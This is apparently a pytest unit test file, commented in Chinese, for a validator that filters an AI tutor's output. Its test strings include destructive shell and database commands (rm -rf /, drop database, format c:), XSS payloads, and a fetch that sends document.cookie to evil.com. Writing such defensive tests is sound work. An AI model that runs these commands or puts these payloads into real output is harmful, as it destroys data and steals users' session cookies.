"""
LLM 输出验证器单元测试

测试敏感信息检测、恶意指令过滤、代码注入防护等功能

作者: Claude Code (Opus 4.5)
创建时间: 2026-01-03
"""

import pytest
from app.core.llm_output_validator import LLMOutputValidator, ValidationResult


class TestLLMOutputValidator:
    """LLM 输出验证器测试类"""

    @pytest.fixture
    def validator(self):
        """创建验证器实例"""
        return LLMOutputValidator(strict_mode=True)

    # =============================================================================
    # 正常输出测试
    # =============================================================================

    def test_normal_output(self, validator):
        """测试正常输出"""
        text = "这是一个正常的回答，包含有用的信息。"
        result = validator.validate(text)

        assert result.is_valid is True
        assert result.sanitized_text == text
        assert result.action == "allow"
        assert len(result.violations) == 0

    def test_educational_content(self, validator):
        """测试教育内容"""
        text = """
        二次函数的导数计算步骤：
        1. 确定函数形式：f(x) = ax² + bx + c
        2. 应用求导公式：f'(x) = 2ax + b
        3. 验证结果
        """
        result = validator.validate(text)

        assert result.is_valid is True

    def test_code_example(self, validator):
        """测试代码示例"""
        text = """
        Python 示例：
        ```python
        def factorial(n):
            if n <= 1:
                return 1
            return n * factorial(n-1)
        ```
        """
        result = validator.validate(text)

        assert result.is_valid is True

    # =============================================================================
    # 敏感信息泄露测试
    # =============================================================================

    def test_api_key_leak(self, validator):
        """测试 API Key 泄露"""
        test_cases = [
            "API key: sk-1234567890abcdef1234567890abcdef",
            "api_key: sk-abcdefghij1234567890klmnopqrstuv",
            "secret: sk-1234567890abcdef1234567890abcdef",
        ]

        for text in test_cases:
            result = validator.validate(text)
            assert result.is_valid is False
            assert result.action == "sanitize"
            assert len(result.violations) > 0
            # 应该遮蔽敏感信息
            assert "*" in result.sanitized_text

    def test_password_leak(self, validator):
        """测试密码泄露"""
        text = "管理员密码是: MySecretPass123"
        result = validator.validate(text)

        assert result.is_valid is False
        assert "*" in result.sanitized_text

    def test_credit_card_leak(self, validator):
        """测试信用卡号泄露"""
        test_cases = [
            "信用卡: 1234-5678-9012-3456",
            "卡号: 1234 5678 9012 3456",
            "1234567890123456",
        ]

        for text in test_cases:
            result = validator.validate(text)
            assert result.is_valid is False
            assert "*" in result.sanitized_text

    def test_ssn_leak(self, validator):
        """测试 SSN 泄露"""
        text = "社保号: 123-45-6789"
        result = validator.validate(text)

        assert result.is_valid is False
        assert "*" in result.sanitized_text

    def test_email_leak(self, validator):
        """测试邮箱泄露"""
        text = "联系邮箱: admin@example.com"
        result = validator.validate(text)

        # 邮箱泄露应该被检测
        if result.risk_score > 0:
            assert "*" in result.sanitized_text or "@" not in result.sanitized_text

    def test_ip_address_leak(self, validator):
        """测试 IP 地址泄露"""
        text = "服务器 IP: 192.168.1.100"
        result = validator.validate(text)

        if result.risk_score > 0:
            assert "*" in result.sanitized_text or "192.168" not in result.sanitized_text

    def test_phone_number_leak(self, validator):
        """测试手机号泄露"""
        text = "手机号: 13812345678"
        result = validator.validate(text)

        if result.risk_score > 0:
            assert "*" in result.sanitized_text

    # =============================================================================
    # 恶意指令过滤测试
    # =============================================================================

    def test_delete_command(self, validator):
        """测试删除命令"""
        test_cases = [
            "请执行: rm -rf /",
            "删除所有文件: delete all files",
            "清空数据库: drop database users",
        ]

        for text in test_cases:
            result = validator.validate(text)
            assert result.is_valid is False
            assert result.action == "block"

    def test_format_command(self, validator):
        """测试格式化命令"""
        text = "格式化 C 盘: format c:"
        result = validator.validate(text)

        assert result.is_valid is False
        assert result.action == "block"

    def test_shutdown_command(self, validator):
        """测试关机命令"""
        text = "系统命令: shutdown -h now"
        result = validator.validate(text)

        assert result.is_valid is False

    def test_kill_command(self, validator):
        """测试杀进程命令"""
        text = "终止进程: kill -9 1234"
        result = validator.validate(text)

        assert result.is_valid is False

    # =============================================================================
    # 代码注入防护测试
    # =============================================================================

    def test_script_tag(self, validator):
        """测试 Script 标签"""
        test_cases = [
            "<script>alert('xss')</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script src='evil.js'></script>",
        ]

        for text in test_cases:
            result = validator.validate(text)
            assert result.is_valid is False
            assert "[SCRIPT_FILTERED]" in result.sanitized_text or result.sanitized_text != text

    def test_javascript_protocol(self, validator):
        """测试 JavaScript 协议"""
        text = "点击这里: javascript:alert(1)"
        result = validator.validate(text)

        assert result.is_valid is False
        assert "javascript:" not in result.sanitized_text

    def test_html_event_handlers(self, validator):
        """测试 HTML 事件处理器"""
        text = "<img src=x onerror=alert(1)>"
        result = validator.validate(text)

        assert result.is_valid is False
        assert "onerror" not in result.sanitized_text

    def test_iframe_injection(self, validator):
        """测试 Iframe 注入"""
        text = "<iframe src='evil.com'></iframe>"
        result = validator.validate(text)

        assert result.is_valid is False

    def test_eval_function(self, validator):
        """测试 eval 函数"""
        text = "代码执行: eval('alert(1)')"
        result = validator.validate(text)

        assert result.is_valid is False

    def test_exec_function(self, validator):
        """测试 exec 函数"""
        text = "执行命令: exec('rm -rf /')"
        result = validator.validate(text)

        assert result.is_valid is False

    # =============================================================================
    # 长度限制测试
    # =============================================================================

    def test_output_length_limit(self, validator):
        """测试输出长度限制"""
        # 超过 10,000 字符
        long_text = "回答内容 " * 5000
        result = validator.validate(long_text)

        assert result.is_valid is True  # 仍然有效,但会被截断
        assert len(result.sanitized_text) <= 10000
        assert "截断" in result.sanitized_text

    def test_exact_length_limit(self, validator):
        """测试正好达到长度限制"""
        exact_text = "a" * 10000
        result = validator.validate(exact_text)

        assert result.is_valid is True
        assert len(result.sanitized_text) == 10000

    # =============================================================================
    # 代码块数量限制测试
    # =============================================================================

    def test_code_block_limit(self, validator):
        """测试代码块数量限制"""
        # 超过 10 个代码块
        text = "```python\nprint(1)\n``` " * 15
        result = validator.validate(text)

        assert result.is_valid is False
        assert "代码块过多" in result.violations[0]

    def test_code_block_within_limit(self, validator):
        """测试代码块数量在限制内"""
        text = "```python\nprint(1)\n``` " * 5
        result = validator.validate(text)

        assert result.is_valid is True

    # =============================================================================
    # 内容合规性测试
    # =============================================================================

    def test_violent_content(self, validator):
        """测试暴力内容"""
        text = "暴力解决这个问题，杀了他"
        result = validator.validate(text)

        # 严格模式下应该标记
        if result.risk_score > 0:
            assert any("暴力" in v for v in result.violations)

    def test_sensitive_topics(self, validator):
        """测试敏感话题"""
        text = "涉及种族歧视的内容"
        result = validator.validate(text)

        # 应该被标记
        if result.risk_score > 0:
            assert any("歧视" in v for v in result.violations)

    # =============================================================================
    # 混合攻击测试
    # =============================================================================

    def test_mixed_attack(self, validator):
        """测试混合攻击"""
        text = "<script>alert('xss')</script> API: sk-1234567890abcdef delete all files"
        result = validator.validate(text)

        assert result.is_valid is False
        assert result.action == "block"
        assert len(result.violations) >= 2

    def test_nested_malicious_content(self, validator):
        """测试嵌套恶意内容"""
        text = """
        正常内容开始
        <script>
        // 尝试删除文件
        fetch('http://evil.com?data=' + document.cookie)
        </script>
        我的密码是: password123
        正常内容结束
        """
        result = validator.validate(text)

        assert result.is_valid is False

    # =============================================================================
    # 边界情况测试
    # =============================================================================

    def test_empty_text(self, validator):
        """测试空文本"""
        result = validator.validate("")
        assert result.is_valid is True
        assert result.sanitized_text == ""

    def test_none_text(self, validator):
        """测试 None"""
        result = validator.validate(None)
        assert result.is_valid is True
        assert result.sanitized_text == ""

    def test_non_string_text(self, validator):
        """测试非字符串"""
        result = validator.validate(123)
        assert result.is_valid is True
        assert result.sanitized_text == ""

    def test_whitespace_only(self, validator):
        """测试仅空白字符"""
        result = validator.validate("   \n\t  ")
        assert result.is_valid is True

    # =============================================================================
    # HTML 转义测试
    # =============================================================================

    def test_html_escape(self, validator):
        """测试 HTML 转义"""
        text = "<div onclick='alert(1)'>Hello</div>"
        escaped = validator.sanitize_html(text)

        assert "<" in escaped
        assert ">" in escaped
        assert "onclick" not in escaped or """ in escaped

    def test_html_escape_preserves_code_blocks(self, validator):
        """测试 HTML 转义保留代码块"""
        text = "```python\nprint('hello')\n```"
        escaped = validator.sanitize_html(text)

        # 代码块标记应该保留
        assert "```" in escaped

    # =============================================================================
    # 截断功能测试
    # =============================================================================

    def test_truncate_if_needed_short(self, validator):
        """测试不需要截断的短文本"""
        text = "短文本"
        result = validator.truncate_if_needed(text)

        assert result == text

    def test_truncate_if_needed_long(self, validator):
        """测试需要截断的长文本"""
        text = "a" * 15000
        result = validator.truncate_if_needed(text)

        assert len(result) == 10000
        assert "截断" in result

    def test_truncate_custom_length(self, validator):
        """测试自定义截断长度"""
        text = "a" * 1000
        result = validator.truncate_if_needed(text, max_length=100)

        assert len(result) == 100

    # =============================================================================
    # 严格模式测试
    # =============================================================================

    def test_strict_mode_on(self):
        """测试严格模式开启"""
        validator = LLMOutputValidator(strict_mode=True)
        text = "敏感信息: API key sk-123"
        result = validator.validate(text)

        assert result.is_valid is False
        assert result.action == "sanitize"

    def test_strict_mode_off(self):
        """测试严格模式关闭"""
        validator = LLMOutputValidator(strict_mode=False)
        text = "敏感信息: API key sk-123"
        result = validator.validate(text)

        # 非严格模式可能仍然检测,但行为不同
        assert isinstance(result, ValidationResult)

    # =============================================================================
    # 统计信息测试
    # =============================================================================

    def test_security_stats(self, validator):
        """测试安全统计信息"""
        stats = validator.get_security_stats()

        assert stats["max_output_length"] == 10000
        assert stats["max_code_blocks"] == 10
        assert stats["strict_mode"] is True
        assert stats["sensitive_patterns"] > 0
        assert stats["malicious_patterns"] > 0
        assert stats["code_injection_patterns"] > 0

    # =============================================================================
    # 上下文信息测试
    # =============================================================================

    def test_with_context(self, validator):
        """测试带上下文的验证"""
        text = "API key: sk-123"
        context = {"user_id": "user_123", "type": "chat"}

        result = validator.validate(text, context)

        # 上下文不影响验证结果,但用于日志
        assert result.is_valid is False

    # =============================================================================
    # 敏感模式匹配测试
    # =============================================================================

    def test_private_key_leak(self, validator):
        """测试私钥泄露"""
        text = "私钥: -----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...\n-----END PRIVATE KEY-----"
        result = validator.validate(text)

        assert result.is_valid is False
        assert "*" in result.sanitized_text

    def test_system_file_path(self, validator):
        """测试系统文件路径"""
        text = "配置文件在 /etc/passwd 和 C:\\Windows\\System32"
        result = validator.validate(text)

        # 应该被标记
        if result.risk_score > 0:
            assert len(result.violations) > 0

    def test_root_directory(self, validator):
        """测试 root 目录"""
        text = "目录: /root/secret"
        result = validator.validate(text)

        if result.risk_score > 0:
            assert len(result.violations) > 0

    # =============================================================================
    # 实际场景测试
    # =============================================================================

    def test_realistic_tutor_response(self, validator):
        """测试真实的辅导响应"""
        text = """
        同学你好！这道题的解法如下：

        首先，我们设函数 f(x) = x² + 2x + 1

        求导过程：
        f'(x) = 2x + 2

        令 f'(x) = 0，解得 x = -1

        因此，函数在 x = -1 处取得极值。

        希望这个解释对你有帮助！
        """
        result = validator.validate(text)

        assert result.is_valid is True

    def test_realistic_code_explanation(self, validator):
        """测试真实的代码解释"""
        text = """
        Python 列表推导式示例：

        ```python
        # 生成 1-10 的平方数
        squares = [x**2 for x in range(1, 11)]
        print(squares)
        ```

        输出: [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]
        """
        result = validator.validate(text)

        assert result.is_valid is True

    def test_malicious_response_blocked(self, validator):
        """测试恶意响应被阻断"""
        text = """
        好的，我来帮你：
        1. 首先执行: rm -rf /
        2. 然后删除: drop database *
        3. 最后: format c:
        """
        result = validator.validate(text)

        assert result.is_valid is False
        assert result.action == "block"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
